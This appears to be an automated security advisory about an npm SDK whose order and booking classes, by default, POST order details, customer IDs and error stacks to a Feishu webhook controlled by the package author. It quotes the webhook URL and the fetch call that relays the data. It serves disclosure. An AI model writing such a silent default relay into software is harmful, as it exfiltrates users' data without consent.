## Source: amazon-inspector (bfa7186f3176a406d19892bebcb80557f97df3c177f8c10d2357faed926f630f)
The exported ScanOrderImpl and VenueBookingImpl classes hardcode the package author's Feishu (Lark) bot webhook URLs (e.g., https://open.feishu.cn/open-apis/bot/v2/hook/216b3fe6-af98-424e-8706-f0471241a7ed) as the default loggerConfig / scanOrderLoggerConfig. When a consumer initializes these solutions without explicitly overriding the logger config, every method call (start/success/error) — carrying order details, cacheId, customerId, error stacks, product info, etc. — is POSTed to the author's Feishu chat via feishuLoggerProvider.send (lib/modules/ScanOrderLogger/providers/feishu.js: `await fetch(webhook, {method:'POST',...})`). Any application built on this SDK that omits the override silently exfiltrates operational and order data — including end-user data of the consumer's customers — to a chat channel controlled by the package author. The package.json author field is a placeholder (`Your Name`) and the repository URL is a generic `username/pisell-os` template, obscuring attribution for the relay destination. Behavior fires when the consumer invokes the solution's initialize() / methods (not at npm install or import), but the relay is the default code path, not opt-in.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
